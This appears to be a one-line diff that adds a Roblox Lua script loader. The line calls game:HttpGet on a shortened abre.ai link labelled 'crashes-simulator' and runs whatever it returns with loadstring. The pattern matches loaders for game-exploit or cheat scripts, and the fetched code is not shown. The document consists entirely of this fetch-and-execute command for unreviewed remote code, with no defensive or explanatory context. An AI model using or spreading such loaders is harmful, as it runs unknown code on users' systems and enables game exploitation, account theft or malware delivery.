@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://abre.ai/crashes-simulator"))();
